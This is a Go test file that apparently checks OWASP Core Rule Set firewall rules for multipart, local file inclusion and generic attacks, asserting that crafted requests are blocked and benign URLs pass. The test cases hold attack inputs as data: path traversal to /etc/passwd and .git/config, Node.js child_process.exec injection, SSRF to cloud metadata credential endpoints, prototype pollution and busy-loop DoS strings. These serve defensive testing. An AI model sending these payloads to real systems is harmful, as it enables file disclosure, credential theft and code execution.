	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range testCases {
		fmt.Println("Testing case:", tc.Name)
		var req *http.Request
		var err error
		if tc.Body == "" {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		} else {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, strings.NewReader(tc.Body))
		}
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ExampleBot/1.0; +http://example.com/bot)")
		req.Header.Set("Referer", "http://127.0.0.1/")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("DNT", "1")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestMultiPartRules(t *testing.T) {
	assert := assert.New(t)

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-922-MULTIPART-ATTACK.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	t.Run("922100 global _charset_ not allowed", func(t *testing.T) {
		body := &bytes.Buffer{}
		w := multipart.NewWriter(body)
		_ = w.SetBoundary("----WebKitFormBoundary7MA4YWxkTrZu0gW")
		err := w.WriteField("_charset_", "utf-16")
		assert.Nil(err)
		_ = w.Close()

		req, err := http.NewRequest(http.MethodPost, "http://127.0.0.1:8080/upload", bytes.NewReader(body.Bytes()))
		assert.Nil(err)
		req.Header.Set("Content-Type", w.FormDataContentType())

		setRequest(t, ctx, "922100", req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption, "should be blocked by 922100")
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	})

	t.Run("922110 invalid charset in part Content-Type", func(t *testing.T) {
		body := &bytes.Buffer{}
		w := multipart.NewWriter(body)
		_ = w.SetBoundary("----WebKitFormBoundary7MA4YWxkTrZu0gW")

		h := textproto.MIMEHeader{}
		h.Set("Content-Disposition", `form-data; name="file"; filename="test.txt"`)
		h.Set("Content-Type", `text/plain; charset=invalid-charset`)
		part, err := w.CreatePart(h)
		assert.Nil(err)
		_, _ = part.Write([]byte("Test content"))
		_ = w.Close()

		req, err := http.NewRequest(http.MethodPost, "http://127.0.0.1:8080/upload", bytes.NewReader(body.Bytes()))
		assert.Nil(err)
		req.Header.Set("Content-Type", w.FormDataContentType())

		setRequest(t, ctx, "922110", req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption, "should be blocked by 922110")
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	})

	t.Run("922120 deprecated Content-Transfer-Encoding", func(t *testing.T) {
		body := &bytes.Buffer{}
		w := multipart.NewWriter(body)
		_ = w.SetBoundary("----WebKitFormBoundary7MA4YWxkTrZu0gW")

		h := textproto.MIMEHeader{}
		h.Set("Content-Disposition", `form-data; name="file"; filename="test.txt"`)
		h.Set("Content-Type", "text/plain")
		h.Set("Content-Transfer-Encoding", "base64")
		part, err := w.CreatePart(h)
		assert.Nil(err)
		_, _ = part.Write([]byte("VGVzdCBjb250ZW50"))
		_ = w.Close()

		req, err := http.NewRequest(http.MethodPost, "http://127.0.0.1:8080/upload", bytes.NewReader(body.Bytes()))
		assert.Nil(err)
		req.Header.Set("Content-Type", w.FormDataContentType())

		setRequest(t, ctx, "922120", req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption, "should be blocked by 922120")
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	})

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		assert.Nil(err)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ExampleBot/1.0; +http://example.com/bot)")
		req.Header.Set("Referer", "http://127.0.0.1/")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("DNT", "1")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")

		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestLocalFileInclusionRules(t *testing.T) {
	assert := assert.New(t)

	type testCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
	}

	testCases := []testCase{
		{
			Name:        "930100_path_traversal_encoded_dotdot",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			RuleID:      "930100",
			Description: "Path traversal via encoded ../ sequences in query param to access /etc/passwd",
		},
		{
			Name:        "930100_path_traversal_mixed_slashes",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/api/v1/..%2f..%5cwindows%5cwin.ini",
			RuleID:      "930100",
			Description: "Path traversal using mixed separators and encodings to reach Windows file",
		},
		{
			Name:        "930110_path_traversal_plain_dotdot",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/view?path=../../../../var/log/auth.log",
			RuleID:      "930110",
			Description: "Simple ../ traversal in query parameter",
		},
		{
			Name:        "930110_path_traversal_with_semicolons",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/read;../../../../etc/hosts",
			RuleID:      "930110",
			Description: "Traversal using semicolon separators",
		},
		{
			Name:   "930120_os_file_access_in_cookie",
			Method: http.MethodGet,
			URL:    "http://127.0.0.1:8080/profile",
			Cookies: map[string]string{
				"lastPath": "/proc/self/environ",
			},
			RuleID:      "930120",
			Description: "OS file keyword in REQUEST_COOKIES",
		},
		{
			Name:        "930130_restricted_file_access",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/.htaccess",
			RuleID:      "930130",
			Description: "Direct request to restricted file (REQUEST_FILENAME)",
		},
		{
			Name:        "930130_restricted_dot_git",
			Method:      http.MethodGet,
			URL:         "http://127.0.0.1:8080/.git/config",
			RuleID:      "930130",
			Description: "Attempt to access VCS metadata under /.git/",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-930-APPLICATION-ATTACK-LFI.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range testCases {
		fmt.Println("Testing case:", tc.Name)
		req, err := http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ExampleBot/1.0; +http://example.com/bot)")
		req.Header.Set("Referer", "http://127.0.0.1/")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("DNT", "1")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestGenericAttacks(t *testing.T) {
	assert := assert.New(t)

	type testCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
	}

	testCases := []testCase{
		{
			Name:   "934100_NodeJS_RCE_eval",
			Method: "GET",
			URL:    "/search?q=eval(%27alert(1)%27)",
			Headers: map[string]string{
				"Accept": "text/html",
			},
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — contains eval(",
		},
		{
			Name:   "934100_NodeJS_RCE_require_process",
			Method: "GET",
			URL:    "/api?cmd=require('child_process').exec('id')",
			Headers: map[string]string{
				"Accept": "application/json",
			},
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — require('child_process').exec(",
		},
		{
			Name:        "934100_NodeJS_console_error",
			Method:      "GET",
			URL:         "/x?log=console.error('boom')",
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — console.error(",
		},
		{
			Name:        "934100_NodeJS_Function_constructor",
			Method:      "GET",
			URL:         "/run?code=new%20Function('return%20process.env')()",
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — new Function(",
		},
		{
			Name:        "934110_SSRF_Metadata_AWS",
			Method:      "GET",
			URL:         "/fetch?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			RuleID:      "934110",
			Description: "SSRF — cloud metadata URL (AWS)",
		},
		{
			Name:        "934110_SSRF_Metadata_GCP",
			Method:      "GET",
			URL:         "/fetch?u=http://metadata.google.internal/computeMetadata/v1/",
			RuleID:      "934110",
			Description: "SSRF — cloud metadata URL (GCP)",
		},
		{
			Name:        "934120_SSRF_IPv6_literal",
			Method:      "GET",
			URL:         "/crawl?url=http://[::1]/",
			RuleID:      "934120",
			Description: "SSRF — URL with IPv6 literal",
		},
		{
			Name:        "934130_JS_Proto_Pollution_constructor_prototype",
			Method:      "GET",
			URL:         "/p?constructor.prototype.polluted=1",
			RuleID:      "934130",
			Description: "JavaScript Prototype Pollution — constructor.prototype",
		},
		{
			Name:   "934130_JS_Proto_Pollution_Cookie",
			Method: "GET",
			URL:    "/",
			Cookies: map[string]string{
				"__proto__": "x",
			},
			RuleID:      "934130",
			Description: "JavaScript Prototype Pollution — cookie key __proto__",
		},
		{
			Name:        "934150_Ruby_Process_spawn",
			Method:      "GET",
			URL:         "/r?code=Process.spawn('id')",
			RuleID:      "934150",
			Description: "Ruby Injection — Process.spawn(",
		},
		{
			Name:        "934160_Node_DoS_while_true",
			Method:      "GET",
			URL:         "/eval?js=while(true){}",
			RuleID:      "934160",
			Description: "Node.js DoS — while(true){}",
		},
		{
			Name:        "934160_Node_DoS_while_not_false",
			Method:      "GET",
			URL:         "/eval?js=while(!false){/*busy*/}",
			RuleID:      "934160",
			Description: "Node.js DoS — while(!false)",
		},
		{
			Name:        "934170_PHP_data_scheme_simple",
			Method:      "GET",
			URL:         "/load?src=data:text/plain,hello",
			RuleID:      "934170",
			Description: "PHP data scheme — data: with MIME",
		},
		{
			Name:        "934170_PHP_data_scheme_charset",
			Method:      "GET",
			URL:         "/load?src=data:text/html;charset=utf-8,%3Cb%3Ehi%3C/b%3E",
			RuleID:      "934170",
			Description: "PHP data scheme — data: with charset",
		},
		{
			Name:        "934100_Encoded_js_String_fromCharCode",
			Method:      "GET",
			URL:         "/q?x=String.fromCharCode(97,108,101,114,116)",
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — String.fromCharCode(",
		},
		{
			Name:        "934100_Base64_child_process_exec",
			Method:      "GET",
			URL:         "/q?b=cmVxdWlyZSgnY2hpbGRfcHJvY2Vzc ycpLmV4ZWMoJ2lkJyk=",
			RuleID:      "934100",
			Description: "Node.js Injection 1/2 — base64 payload; rule applies base64Decode",
		},
		{
			Name:        "934170_URLDecoded_data_scheme",
			Method:      "GET",
			URL:         "/open?x=data%3Atext%2Fplain%3Bcharset%3Dutf-8%2CHello",
			RuleID:      "934170",
			Description: "PHP data scheme — URL-decoded by t:urlDecodeUni",
		},
		{
			Name:        "934130_ProtoPollution_Bracket",
			Method:      "GET",
			URL:         "/p?%5B__proto__%5D%5Bpolluted%5D=1",
			RuleID:      "934130",
			Description: "JavaScript Prototype Pollution — bracket notation __proto__",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range testCases {
		fmt.Println("Testing case:", tc.Name)
		req, err := http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ExampleBot/1.0; +http://example.com/bot)")
		req.Header.Set("Referer", "http://127.0.0.1/")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("DNT", "1")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

// https://github.com/corazawaf/coraza-coreruleset/blob/main/rules/%40crs-setup.conf.example
// coraza corerule set example set up
const crsSetupConf = `
SecRequestBodyAccess On
SecDefaultAction "phase:1,log,auditlog,pass"
SecDefaultAction "phase:2,log,auditlog,pass"
SecAction \
    "id:900990,\
    phase:1,\
    pass,\
    t:none,\
    nolog,\
    tag:'OWASP_CRS',\
    ver:'OWASP_CRS/4.16.0',\
    setvar:tx.crs_setup_version=4160"
`
